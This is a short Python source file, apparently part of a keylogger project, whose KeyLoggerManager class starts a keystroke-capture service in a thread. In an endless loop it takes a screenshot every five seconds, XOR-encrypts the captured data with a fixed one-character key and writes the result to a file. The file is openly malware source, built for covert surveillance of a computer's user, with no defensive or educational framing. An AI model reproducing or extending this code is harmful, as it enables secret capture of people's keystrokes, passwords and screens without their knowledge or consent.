from  KeyloggerService import *
from FileWriter import *
import threading
import time
from  IEncryptor import *

from modules.Encryptor import XOREncryptor


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()
        self.encryptor :  IEncryptor = XOREncryptor()
        self.writer : IWriter = FileWriter()

    def start(self):
        self.instance.start()

    def write_to_file(self):
        self.writer.write(self.instance.get_data())

    def main(self):
        threading.Thread(target=self.start).start()

        while True:
            print(self.instance.current_app == self.instance.prev_up)
            self.instance.current_screenshot()
            x = self.instance.get_data()
            x = self.encryptor.encryption(x, "a")
            self.writer.write(x)
            time.sleep(5)

A = KeyLoggerManager()
A.main()
